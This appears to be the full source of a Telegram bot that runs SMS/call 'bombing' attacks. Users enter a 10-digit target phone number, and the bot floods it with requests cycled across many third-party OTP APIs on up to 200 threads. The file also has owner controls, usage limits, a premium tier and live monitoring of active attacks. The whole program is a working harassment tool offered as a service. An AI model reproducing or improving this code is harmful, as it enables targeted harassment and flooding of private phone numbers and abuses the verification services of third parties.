                "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                "   ❌ *NOT VERIFIED*\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                "You're not a member of the channel yet\\.\n\n"
                "👇 *Steps again:*\n"
                "1\\. Click *📢 JOIN CHANNEL*\n"
                "2\\. Join the channel\n"
                "3\\. Come back and click *VERIFY*\n\n"
                f"📢 `{esc(CHANNEL_USERNAME)}`\n\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━")
            try:
                await q.edit_message_text(not_joined_txt,
                    reply_markup=join_keyboard(),
                    parse_mode="MarkdownV2", disable_web_page_preview=True)
            except Exception:
                await prompt_join(q)
        return

# ===================== BOMBING ENGINE =====================
def bombing_worker(user_id, phone_number, context):
    cc = get_active_country()
    config = get_config()
    delay = config.get("global_delay", BOMBING_DELAY_SECONDS)
    user_max, _, _ = get_user_limits(user_id)
    avail = [i for i in range(get_api_count()) if get_api_status().get(str(i), True)]
    while bombing_active.get(user_id) and not global_pause["active"]:
        if get_daily_count(user_id) >= user_max:
            break
        if not avail:
            avail = [i for i in range(get_api_count()) if get_api_status().get(str(i), True)]
            if not avail:
                break
        idx = random.choice(avail)
        ok = getapi(phone_number, idx, cc)
        with global_request_counter:
            request_counts[user_id] = request_counts.get(user_id, 0) + 1
        inc_daily_count(user_id)
        if user_id in active_bombings_detail:
            active_bombings_detail[user_id]["apis_used"].add(idx)
            active_bombings_detail[user_id]["requests"] = request_counts.get(user_id, 0)
        if not ok and idx in avail:
            avail.remove(idx)
        time.sleep(delay)

async def start_bombing_task(user_id, phone_number, context):
    chat_id = user_id
    config = get_config()
    thread_count = config.get("thread_count", THREAD_COUNT)
    if is_banned(user_id):
        await context.bot.send_message(chat_id, esc("🚫 You are banned."), parse_mode="MarkdownV2")
        return
    if is_protected(phone_number):
        await context.bot.send_message(chat_id, esc(f"🛡️ Protected: `{phone_number}`"), parse_mode="MarkdownV2")
        return
    if is_blacklisted(phone_number):
        await context.bot.send_message(chat_id, esc(f"⛔ Blacklisted: `{phone_number}`"), parse_mode="MarkdownV2")
        return
    cd = get_cooldown_remaining(user_id)
    if cd > 0 and user_id != OWNER_ID:
        await context.bot.send_message(chat_id, esc(f"🕐 Cooldown: `{cd}`s"), parse_mode="MarkdownV2")
        return
    _, user_threads, _ = get_user_limits(user_id)
    actual_threads = min(thread_count, user_threads)
    user_max, _, _ = get_user_limits(user_id)
    if get_daily_count(user_id) >= user_max:
        await context.bot.send_message(chat_id, esc(f"📈 Limit: `{user_max}`"), parse_mode="MarkdownV2")
        return
    request_counts[user_id] = 0
    bombing_active[user_id] = True
    active_bombings_detail[user_id] = {
        "target": phone_number, "started": time.time(),
        "requests": 0, "apis_used": set(), "threads": actual_threads}
    await context.bot.send_message(chat_id,
        esc(f"💣 *Started*\nTarget: `{phone_number}`\nThreads: `{actual_threads}`"),
        parse_mode="MarkdownV2")
    if user_id != OWNER_ID:
        try:
            await context.bot.send_message(OWNER_ID,
                esc(f"🔔 New bombing\nUser: `{user_id}`\nTarget: `{phone_number}`"),
                parse_mode="MarkdownV2")
        except Exception:
            pass
    workers = []
    for _ in range(actual_threads):
        t = threading.Thread(target=bombing_worker, args=(user_id, phone_number, context))
        t.daemon = True
        workers.append(t)
        t.start()
    bombing_threads[str(user_id)] = workers
    try:
        last_c, last_t = 0, 0
        while bombing_active.get(user_id):
            await asyncio.sleep(1)
            cur = request_counts.get(user_id, 0)
            now = time.time()
            if cur > last_c and (now - last_t) >= TELEGRAM_RATE_LIMIT_SECONDS:
                try:
                    await context.bot.send_message(chat_id, esc(f"📊 `{cur}` sent"), parse_mode="MarkdownV2")
                except Exception:
                    pass
                last_c, last_t = cur, now
            if get_daily_count(user_id) >= user_max:
                bombing_active[user_id] = False
                break
    finally:
        bombing_active[user_id] = False
        for t in workers:
            t.join(timeout=1)
        bombing_threads.pop(str(user_id), None)
        active_bombings_detail.pop(user_id, None)
        final_count = request_counts.pop(user_id, 0)
        log_bombing(user_id, phone_number, final_count)
        set_cooldown(user_id)
        u = get_user(user_id) or {}
        update_user(user_id, {
            "total_bombings": u.get("total_bombings", 0) + 1,
            "total_requests": u.get("total_requests", 0) + final_count,
        })
        try:
            await context.bot.send_message(chat_id,
                esc(f"✅ Finished — `{final_count}` requests"), parse_mode="MarkdownV2")
        except Exception:
            pass

# ===================== USER HANDLERS =====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user
    uid = u.id
    update_user(uid, {"username": u.username or "", "first_name": u.first_name or ""})
    if is_banned(uid):
        await update.message.reply_text("🚫 You are banned.")
        return
    if uid != OWNER_ID and not await is_user_joined(context, uid):
        await prompt_join(update.message)
        return
    await send_main_menu(context, update.message.chat_id, uid)

async def cancel_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return
    context.user_data.pop("admin_action", None)
    await update.message.reply_text("❌ Cancelled.")

async def handle_admin_action(update, context) -> bool:
    uid = update.effective_user.id
    text = update.message.text
    action = context.user_data.get("admin_action")
    if not action or uid != OWNER_ID:
        return False
    try:
        if action == "ban_add":
            t = text.strip()
            if not t.isdigit():
                await update.message.reply_text("❌ Numeric ID only.")
                return True
            b = load_json(BANNED_FILE, [])
            if t not in b:
                b.append(t); save_json(BANNED_FILE, b)
                log_action(uid, "ban_add", t)
                try:
                    await context.bot.send_message(int(t), "🚫 You have been banned.")
                except Exception:
                    pass
                await update.message.reply_text(f"✅ Banned: {t}")
            else:
                await update.message.reply_text("⚠️ Already banned.")
            context.user_data.pop("admin_action", None); return True
        if action == "ban_remove":
            t = text.strip()
            b = load_json(BANNED_FILE, [])
            if t in b:
                b.remove(t); save_json(BANNED_FILE, b)
                log_action(uid, "ban_remove", t)
                await update.message.reply_text(f"✅ Unbanned: {t}")
            else:
                await update.message.reply_text("⚠️ Not banned.")
            context.user_data.pop("admin_action", None); return True
        if action == "prot_add":
            n = text.strip()
            if not (n.isdigit() and len(n) == 10):
                await update.message.reply_text("❌ 10-digit number.")
                return True
            p = load_json(PROTECTED_FILE, [])
            if n not in p:
                p.append(n); save_json(PROTECTED_FILE, p)
                log_action(uid, "prot_add", n)
                await update.message.reply_text(f"✅ Protected: {n}")
            else:
                await update.message.reply_text("⚠️ Already protected.")
            context.user_data.pop("admin_action", None); return True
        if action == "prot_remove":
            n = text.strip()
            p = load_json(PROTECTED_FILE, [])
            if n in p:
                p.remove(n); save_json(PROTECTED_FILE, p)
                log_action(uid, "prot_remove", n)
                await update.message.reply_text(f"✅ Removed: {n}")
            else:
                await update.message.reply_text("⚠️ Not protected.")
            context.user_data.pop("admin_action", None); return True
        if action == "api_toggle":
            try:
                i = int(text.strip())
                if not (0 <= i < get_api_count()):
                    raise ValueError
            except ValueError:
                await update.message.reply_text("❌ Invalid index.")
                return True
            st = get_api_status()
            st[str(i)] = not st.get(str(i), True)
            set_api_status(st)
            await update.message.reply_text(f"✅ API {i}: {'ON' if st[str(i)] else 'OFF'}")
            context.user_data.pop("admin_action", None); return True
        if action == "cfg_delay":
            try:
                v = float(text.strip())
                if v <= 0: raise ValueError
            except ValueError:
                await update.message.reply_text("❌ Positive number.")
                return True
            c = get_config(); c["global_delay"] = v; save_config(c)
            await update.message.reply_text(f"✅ Delay: {v}s")
            context.user_data.pop("admin_action", None); return True
        if action == "cfg_threads":
            try:
                v = int(text.strip())
                if not (1 <= v <= 200): raise ValueError
            except ValueError:
                await update.message.reply_text("❌ 1-200.")
                return True
            c = get_config(); c["thread_count"] = v; save_config(c)
            await update.message.reply_text(f"✅ Threads: {v}")
            context.user_data.pop("admin_action", None); return True
        if action == "cfg_limit":
            try:
                v = int(text.strip())
                if v <= 0: raise ValueError
            except ValueError:
                await update.message.reply_text("❌ Positive.")
                return True
            c = get_config(); c["daily_limit"] = v; save_config(c)
            await update.message.reply_text(f"✅ Limit: {v}")
            context.user_data.pop("admin_action", None); return True
        if action == "bc_all":
            users = load_json(USERS_FILE, {})
            sent = failed = 0
            await update.message.reply_text(f"📢 Sending to {len(users)} users...")
            for tid in users.keys():
                try:
                    await context.bot.send_message(int(tid),
                        f"📢 *Announcement*\n\n{text}", parse_mode="Markdown")
                    sent += 1
                except Exception:
                    failed += 1
                await asyncio.sleep(0.05)
            log_action(uid, "bc_all", f"sent={sent} failed={failed}")
            await update.message.reply_text(f"✅ Sent: {sent}, Failed: {failed}")
            context.user_data.pop("admin_action", None); return True
        if action == "bc_one":
            if "|" not in text:
                await update.message.reply_text("❌ Format: ID | message")
                return True
            parts = text.split("|", 1)
            tid, msg = parts[0].strip(), parts[1].strip()
            try:
                await context.bot.send_message(int(tid),
                    f"📢 *Message*\n\n{msg}", parse_mode="Markdown")
                await update.message.reply_text(f"✅ Sent to {tid}")
            except Exception as e:
                await update.message.reply_text(f"❌ Failed: {e}")
            context.user_data.pop("admin_action", None); return True
        if action == "prem_add":
            t = text.strip()
            if not t.isdigit():
                await update.message.reply_text("❌ Numeric ID.")
                return True
            p = load_json(PREMIUM_FILE, [])
            if t not in p:
                p.append(t); save_json(PREMIUM_FILE, p)
                await update.message.reply_text(f"✅ Premium: {t}")
            else:
                await update.message.reply_text("⚠️ Already premium.")
            context.user_data.pop("admin_action", None); return True
        if action == "prem_del":
            t = text.strip()
            p = load_json(PREMIUM_FILE, [])
            if t in p:
                p.remove(t); save_json(PREMIUM_FILE, p)
                await update.message.reply_text(f"✅ Removed: {t}")
            else:
                await update.message.reply_text("⚠️ Not premium.")
            context.user_data.pop("admin_action", None); return True
        if action == "bl_add_exact":
            n = text.strip()
            if not (n.isdigit() and len(n) == 10):
                await update.message.reply_text("❌ 10 digits.")
                return True
            bl = load_json(BLACKLIST_FILE, {"patterns": [], "exact": []})
            if n not in bl["exact"]:
                bl["exact"].append(n); save_json(BLACKLIST_FILE, bl)
                await update.message.reply_text(f"⛔ Blocked: {n}")
            else:
                await update.message.reply_text("⚠️ Already blocked.")
            context.user_data.pop("admin_action", None); return True
        if action == "bl_add_pat":
            p = text.strip()
            if not p.isdigit():
                await update.message.reply_text("❌ Digits only.")
                return True
            bl = load_json(BLACKLIST_FILE, {"patterns": [], "exact": []})
            if p not in bl["patterns"]:
                bl["patterns"].append(p); save_json(BLACKLIST_FILE, bl)
                await update.message.reply_text(f"⛔ Pattern: {p}*")
            else:
                await update.message.reply_text("⚠️ Already.")
            context.user_data.pop("admin_action", None); return True
        if action == "country_set":
            code = text.strip().lstrip("+")
            if not code.isdigit():
                await update.message.reply_text("❌ Digits only.")
                return True
            save_json(COUNTRY_FILE, {"code": code})
            await update.message.reply_text(f"🌍 Country: +{code}")
            context.user_data.pop("admin_action", None); return True
    except Exception as e:
        log.error(f"admin action: {e}")
        await update.message.reply_text(f"❌ Error: {e}")
        context.user_data.pop("admin_action", None)
        return True
    return False

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    text = update.message.text or ""
    if is_banned(uid):
        await update.message.reply_text("🚫 Banned.")
        return
    if await handle_admin_action(update, context):
        return
    if uid != OWNER_ID and not await is_user_joined(context, uid):
        await prompt_join(update.message)
        return
    update_user(uid, {})
    if text == "🔐 Admin Panel" and uid == OWNER_ID:
        await admin_panel(update, context); return
    if text == "🛡️ Set Protected" and uid == OWNER_ID:
        context.user_data["admin_action"] = "prot_add"
        await update.message.reply_text("Send 10-digit number to protect:")
        return
    if text == "📘 Show Protected" and uid == OWNER_ID:
        p = load_json(PROTECTED_FILE, [])
        txt = "🛡️ Protected:\n" + ("\n".join(p) if p else "none")
        await update.message.reply_text(esc(txt), parse_mode="MarkdownV2")
        return
    if text == "🔥 Start Bombing":
        if bombing_active.get(uid):
            await update.message.reply_text("⚠️ Already running."); return
        context.user_data["awaiting_target"] = True
        await update.message.reply_text("🎯 Send 10-digit target number:")
        return
    if text == "🛑 Stop Bombing":
        if bombing_active.get(uid):
            bombing_active[uid] = False
            await update.message.reply_text("🛑 Stopping...")
        else:
            await update.message.reply_text("ℹ️ No active bombing.")
        return
    if context.user_data.get("awaiting_target"):
        if text.isdigit() and len(text) == 10:
            if is_protected(text):
                await update.message.reply_text(f"🛡️ Protected: {text}")
                context.user_data["awaiting_target"] = False
                return
            context.user_data["awaiting_target"] = False
            bombing_active[uid] = True
            asyncio.create_task(start_bombing_task(uid, text, context))
        else:
            await update.message.reply_text("❌ 10-digit number.")

# ===================== ADMIN PANEL CALLBACK =====================
def _is_owner(uid): return uid == OWNER_ID

def _admin_main_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📊 Dashboard", callback_data="adm:dashboard"),
         InlineKeyboardButton("🔴 Live Monitor", callback_data="adm:live")],
        [InlineKeyboardButton("👥 Users", callback_data="adm:users"),
         InlineKeyboardButton("📈 Stats", callback_data="adm:stats")],
        [InlineKeyboardButton("🚫 Ban/Unban", callback_data="adm:ban_menu"),
         InlineKeyboardButton("🛡️ Protected", callback_data="adm:prot_menu")],
        [InlineKeyboardButton("🔌 APIs + Health", callback_data="adm:api_menu")],
        [InlineKeyboardButton("⚙️ Config", callback_data="adm:cfg_menu"),
         InlineKeyboardButton("📜 Logs", callback_data="adm:logs")],
        [InlineKeyboardButton("📢 Broadcast", callback_data="adm:bc_menu"),
         InlineKeyboardButton("💎 Premium", callback_data="adm:prem_menu")],
        [InlineKeyboardButton("⛔ Blacklist", callback_data="adm:bl_menu"),
         InlineKeyboardButton("🌍 Country", callback_data="adm:country_menu")],
        [InlineKeyboardButton("⏸️ Global Pause", callback_data="adm:global_pause"),
         InlineKeyboardButton("💾 Backup Now", callback_data="adm:backup")],
        [InlineKeyboardButton("🔄 Refresh", callback_data="adm:main")],
    ])

def _back_kb(target="adm:main"):
    return InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data=target)]])

async def admin_panel(update, context):
    if not _is_owner(update.effective_user.id): return
    context.user_data.pop("admin_action", None)
    await update.message.reply_text(
        esc("🔐 *ADMIN PANEL*\n\nSelect an option:"),
        reply_markup=_admin_main_kb(), parse_mode="MarkdownV2")

async def admin_callback(update, context):
    q = update.callback_query
    await q.answer()
    if not _is_owner(q.from_user.id):
        await q.edit_message_text("⛔ Denied."); return
    data = q.data
    if not data.startswith("adm:"): return
    a = data[4:]

    if a == "main":
        context.user_data.pop("admin_action", None)
        try:
            await q.edit_message_text(esc("🔐 *ADMIN PANEL*"),
                reply_markup=_admin_main_kb(), parse_mode="MarkdownV2")
        except Exception:
            await q.message.reply_text(esc("🔐 *ADMIN PANEL*"),
                reply_markup=_admin_main_kb(), parse_mode="MarkdownV2")
        return

    if a == "users":
        users = load_json(USERS_FILE, {})
        if not users:
            await q.edit_message_text("👥 No users.", reply_markup=_back_kb()); return
        txt = "👥 *USERS*\n\n"
        for uid, info in list(users.items())[-15:]:
            txt += f"🆔 `{uid}` | 💣 `{info.get('total_bombings',0)}` | 📨 `{info.get('total_requests',0)}`\n"
        txt += f"\n*Total:* `{len(users)}`"
        await q.edit_message_text(esc(txt), reply_markup=_back_kb(), parse_mode="MarkdownV2")
        return

    if a == "stats":
        users = load_json(USERS_FILE, {})
        tb = sum(u.get("total_bombings", 0) for u in users.values())
        tr = sum(u.get("total_requests", 0) for u in users.values())
        up = int(time.time() - bot_start_time)
        h, m = up // 3600, (up % 3600) // 60
        txt = (f"📊 *STATS*\n\n👥 Users: `{len(users)}`\n"
               f"🚫 Banned: `{len(load_json(BANNED_FILE,[]))}`\n"
               f"🛡️ Protected: `{len(load_json(PROTECTED_FILE,[]))}`\n"
               f"💣 Bombings: `{tb}`\n📨 Requests: `{tr}`\n"
               f"⚡ Active: `{sum(1 for v in bombing_active.values() if v)}`\n"
               f"⏱️ Uptime: `{h}h {m}m`")
        await q.edit_message_text(esc(txt), reply_markup=_back_kb(), parse_mode="MarkdownV2")
        return

    if a == "dashboard":
        users = load_json(USERS_FILE, {})
        stats = load_json(API_STATS_FILE, {})
        s = sum(v.get("success", 0) for v in stats.values())
        f = sum(v.get("fail", 0) for v in stats.values())
        rate = (s / (s + f) * 100) if (s + f) else 0
        st = get_api_status()
        dead = [i for i in range(get_api_count()) if not st.get(str(i), True)]
        up = int(time.time() - bot_start_time)
        h, m = up // 3600, (up % 3600) // 60
        tt = sum(get_daily_count(uid) for uid in users.keys())
        txt = (f"📊 *DASHBOARD*\n\n⚡ Active: `{sum(1 for v in bombing_active.values() if v)}`\n"
               f"⏸️ Pause: `{'ON' if global_pause['active'] else 'OFF'}`\n"
               f"👥 Users: `{len(users)}`\n📨 Today: `{tt}`\n"
               f"✅ Rate: `{rate:.1f}%`\n❌ Dead: `{len(dead)}`\n"
               f"⏱️ Uptime: `{h}h {m}m`")
        await q.edit_message_text(esc(txt),
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔄 Refresh", callback_data="adm:dashboard")],
                [InlineKeyboardButton("🔙 Back", callback_data="adm:main")]
            ]), parse_mode="MarkdownV2")
        return

    if a == "live":
        if not active_bombings_detail:
            await q.edit_message_text(esc("🔴 No active."),
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔄 Refresh", callback_data="adm:live")],
                    [InlineKeyboardButton("🔙 Back", callback_data="adm:main")]
                ]), parse_mode="MarkdownV2")
            return
        txt = "🔴 *LIVE*\n\n"
        btns = []
        for uid, info in list(active_bombings_detail.items())[:8]:
            rt = int(time.time() - info["started"])
            txt += f"👤 `{uid}` → `{info['target']}` | 📨 `{info['requests']}` | ⏱️ `{rt}s`\n"
            btns.append([InlineKeyboardButton(f"⛔ Stop {uid}",
                callback_data=f"adm:forcestop:{uid}")])
        btns.append([InlineKeyboardButton("⛔ STOP ALL", callback_data="adm:forcestop:all")])
        btns.append([InlineKeyboardButton("🔄 Refresh", callback_data="adm:live")])
        btns.append([InlineKeyboardButton("🔙 Back", callback_data="adm:main")])
        await q.edit_message_text(esc(txt),
            reply_markup=InlineKeyboardMarkup(btns), parse_mode="MarkdownV2")
        return

    if a.startswith("forcestop:"):
        t = a.split(":", 1)[1]
        if t == "all":
            n = 0
            for uid in list(bombing_active.keys()):
                if bombing_active.get(uid):
                    bombing_active[uid] = False
                    n += 1
            await q.edit_message_text(esc(f"⛔ Stopped {n}"),
                reply_markup=_back_kb("adm:live"), parse_mode="MarkdownV2")
        else:
            try:
                iu = int(t)
                if bombing_active.get(iu):
                    bombing_active[iu] = False
                    await q.edit_message_text(esc(f"⛔ Stopped {t}"),
                        reply_markup=_back_kb("adm:live"), parse_mode="MarkdownV2")
                else:
                    await q.edit_message_text(esc(f"⚠️ No active for {t}"),
                        reply_markup=_back_kb("adm:live"), parse_mode="MarkdownV2")
            except Exception:
                await q.edit_message_text("❌ Error", reply_markup=_back_kb("adm:live"))
        return

    if a == "global_pause":
        global_pause["active"] = not global_pause["active"]
        state = "PAUSED ⏸️" if global_pause["active"] else "RESUMED ▶️"
        await q.edit_message_text(esc(f"⏸️ {state}"),
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔄 Toggle", callback_data="adm:global_pause")],
                [InlineKeyboardButton("🔙 Back", callback_data="adm:main")]
            ]), parse_mode="MarkdownV2")
        return

    if a == "api_menu":
        total = get_api_count()
        st = get_api_status()
        en = sum(1 for i in range(total) if st.get(str(i), True))
        txt = f"🔌 *APIs* — Total `{total}` | ✅ `{en}` | ❌ `{total-en}`\n\n"
        for i in range(min(total, 40)):
            mk = "✅" if st.get(str(i), True) else "❌"
            txt += f"{mk} `{i:03d}` {esc(get_api_name(i))}\n"
        if total > 40:
            txt += f"\n...and {total-40} more"
        await q.edit_message_text(esc(txt),
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔄 Toggle", callback_data="adm:api_toggle")],
                [InlineKeyboardButton("✅ All ON", callback_data="adm:api_all_on")],
                [InlineKeyboardButton("❌ All OFF", callback_data="adm:api_all_off")],
                [InlineKeyboardButton("🔙 Back", callback_data="adm:main")]
            ]), parse_mode="MarkdownV2")
        return

    if a == "api_toggle":
        context.user_data["admin_action"] = "api_toggle"
        await q.edit_message_text(esc(f"Send API index (0-{get_api_count()-1}):"))
        return
    if a == "api_all_on":
        set_api_status({str(i): True for i in range(get_api_count())})
        await q.edit_message_text(esc("✅ All ON."), reply_markup=_back_kb("adm:api_menu"))
        return
    if a == "api_all_off":
        set_api_status({str(i): False for i in range(get_api_count())})
        await q.edit_message_text(esc("❌ All OFF."), reply_markup=_back_kb("adm:api_menu"))
        return

    if a == "cfg_menu":
        c = get_config()
        txt = (f"⚙️ *CONFIG*\n\n⏱️ Delay: `{c.get('global_delay')}`\n"
               f"🧵 Threads: `{c.get('thread_count')}`\n"
               f"📈 Limit: `{c.get('daily_limit')}`")
        await q.edit_message_text(esc(txt),
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("⏱️ Delay", callback_data="adm:cfg_delay")],
                [InlineKeyboardButton("🧵 Threads", callback_data="adm:cfg_threads")],
                [InlineKeyboardButton("📈 Limit", callback_data="adm:cfg_limit")],
                [InlineKeyboardButton("🔙 Back", callback_data="adm:main")]
            ]), parse_mode="MarkdownV2")
        return
    if a == "cfg_delay":
        context.user_data["admin_action"] = "cfg_delay"
        await q.edit_message_text(esc("Send delay (s):")); return
    if a == "cfg_threads":
        context.user_data["admin_action"] = "cfg_threads"
        await q.edit_message_text(esc("Send threads (1-200):")); return
    if a == "cfg_limit":
        context.user_data["admin_action"] = "cfg_limit"
        await q.edit_message_text(esc("Send daily limit:")); return

    if a == "ban_menu":
        b = load_json(BANNED_FILE, [])
        txt = "🚫 *BAN*\n\n" + ("\n".join(f"`{x}`" for x in b[:20]) if b else "none")
        await q.edit_message_text(esc(txt),
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("➕ Ban", callback_data="adm:ban_add")],
                [InlineKeyboardButton("❌ Unban", callback_data="adm:ban_remove")],
                [InlineKeyboardButton("🔙 Back", callback_data="adm:main")]
            ]), parse_mode="MarkdownV2")
        return
    if a == "ban_add":
        context.user_data["admin_action"] = "ban_add"
        await q.edit_message_text(esc("Send user ID:")); return
    if a == "ban_remove":
        context.user_data["admin_action"] = "ban_remove"
        await q.edit_message_text(esc("Send user ID:")); return

    if a == "prot_menu":
        p = load_json(PROTECTED_FILE, [])
        txt = "🛡️ *PROTECTED*\n\n" + ("\n".join(f"`{x}`" for x in p[:25]) if p else "none")
        await q.edit_message_text(esc(txt),
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("➕ Add", callback_data="adm:prot_add")],
                [InlineKeyboardButton("❌ Remove", callback_data="adm:prot_remove")],
                [InlineKeyboardButton("🔙 Back", callback_data="adm:main")]
            ]), parse_mode="MarkdownV2")
        return
    if a == "prot_add":
        context.user_data["admin_action"] = "prot_add"
        await q.edit_message_text(esc("Send 10-digit number:")); return
    if a == "prot_remove":
        context.user_data["admin_action"] = "prot_remove"
        await q.edit_message_text(esc("Send number:")); return

    if a == "logs":
        logs = load_json(LOGS_FILE, [])
        if not logs:
            await q.edit_message_text("📜 No logs.", reply_markup=_back_kb()); return
        txt = "📜 *LOGS*\n\n"
        for lg in logs[-15:]:
            txt += f"`{lg.get('timestamp','-')}` | `{lg.get('user_id','-')}` | {esc(str(lg.get('action','-')))} \n"
        await q.edit_message_text(esc(txt),
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🗑️ Clear", callback_data="adm:logs_clear")],
                [InlineKeyboardButton("🔙 Back", callback_data="adm:main")]
            ]), parse_mode="MarkdownV2")
        return
    if a == "logs_clear":
        save_json(LOGS_FILE, [])
        await q.edit_message_text(esc("🗑️ Cleared."), reply_markup=_back_kb())
        return

    if a == "bc_menu":
        users = load_json(USERS_FILE, {})
        await q.edit_message_text(esc(f"📢 *BROADCAST*\n\nUsers: `{len(users)}`"),
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("📨 All", callback_data="adm:bc_all")],
                [InlineKeyboardButton("📨 One", callback_data="adm:bc_one")],
                [InlineKeyboardButton("🔙 Back", callback_data="adm:main")]
            ]), parse_mode="MarkdownV2")
        return
    if a == "bc_all":
        context.user_data["admin_action"] = "bc_all"
        await q.edit_message_text(esc("Send message for ALL:")); return
    if a == "bc_one":
        context.user_data["admin_action"] = "bc_one"
        await q.edit_message_text(esc("Send: `ID | message`")); return

    if a == "prem_menu":
        pr = load_json(PREMIUM_FILE, [])
        txt = "💎 *PREMIUM*\n\n" + ("\n".join(f"`{x}`" for x in pr[:20]) if pr else "none")
        await q.edit_message_text(esc(txt),
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("➕ Add", callback_data="adm:prem_add")],
                [InlineKeyboardButton("❌ Remove", callback_data="adm:prem_del")],
                [InlineKeyboardButton("🔙 Back", callback_data="adm:main")]
            ]), parse_mode="MarkdownV2")
        return
    if a == "prem_add":
        context.user_data["admin_action"] = "prem_add"
        await q.edit_message_text(esc("Send user ID:")); return
    if a == "prem_del":
        context.user_data["admin_action"] = "prem_del"
        await q.edit_message_text(esc("Send user ID:")); return

    if a == "bl_menu":
        bl = load_json(BLACKLIST_FILE, {"patterns": [], "exact": []})
        txt = (f"⛔ *BLACKLIST*\n\nExact: `{len(bl.get('exact',[]))}`\n"
               f"Patterns: `{len(bl.get('patterns',[]))}`\n\n")
        if bl.get("exact"):
            txt += "Exact:\n" + "\n".join(f"`{n}`" for n in bl["exact"][:10]) + "\n\n"
        if bl.get("patterns"):
            txt += "Patterns:\n" + "\n".join(f"`{p}*`" for p in bl["patterns"][:10])
        await q.edit_message_text(esc(txt),
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("➕ Exact", callback_data="adm:bl_add_exact")],
                [InlineKeyboardButton("➕ Pattern", callback_data="adm:bl_add_pat")],
                [InlineKeyboardButton("🗑️ Clear", callback_data="adm:bl_clear")],
                [InlineKeyboardButton("🔙 Back", callback_data="adm:main")]
            ]), parse_mode="MarkdownV2")
        return
    if a == "bl_add_exact":
        context.user_data["admin_action"] = "bl_add_exact"
        await q.edit_message_text(esc("Send 10-digit number:")); return
    if a == "bl_add_pat":
        context.user_data["admin_action"] = "bl_add_pat"
        await q.edit_message_text(esc("Send pattern prefix:")); return
    if a == "bl_clear":
        save_json(BLACKLIST_FILE, {"patterns": [], "exact": []})
        await q.edit_message_text(esc("🗑️ Cleared."), reply_markup=_back_kb("adm:bl_menu"))
        return

    if a == "country_menu":
        c = get_active_country()
        await q.edit_message_text(esc(f"🌍 Active: `+{c}`"),
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("✏️ Change", callback_data="adm:country_set")],
                [InlineKeyboardButton("🔙 Back", callback_data="adm:main")]
            ]), parse_mode="MarkdownV2")
        return
    if a == "country_set":
        context.user_data["admin_action"] = "country_set"
        await q.edit_message_text(esc("Send country code (digits):")); return

    if a == "backup":
        ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        n = 0
        for f in [USERS_FILE, BANNED_FILE, PROTECTED_FILE, CONFIG_FILE,
                  LOGS_FILE, BOMBING_HISTORY_FILE, API_STATS_FILE,
                  PREMIUM_FILE, BLACKLIST_FILE]:
            if os.path.exists(f):
                try:
                    with open(f, "rb") as src, open(os.path.join(BACKUP_DIR, f"{ts}_{f}"), "wb") as dst:
                        dst.write(src.read())
                    n += 1
                except Exception:
                    pass
        await q.edit_message_text(esc(f"💾 Backed up `{n}` files."),
            reply_markup=_back_kb(), parse_mode="MarkdownV2")
        return

# ===================== MAIN =====================
def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("cancel", cancel_cmd))
    app.add_handler(CallbackQueryHandler(join_callback,
        pattern=r"^(join_check|join_help|join_back)$"))
    app.add_handler(CallbackQueryHandler(admin_callback, pattern=r"^adm:"))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    print("=" * 50)
    print("✅ BOT RUNNING")
    print(f"🤖 Bot:     {BOT_TOKEN.split(':')[0]}")
    print(f"👑 Owner:   {OWNER_ID}")
    print(f"📢 Channel: {CHANNEL_USERNAME}")
    print(f"🔌 APIs:    {len(APIS)}")
    print("=" * 50)
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()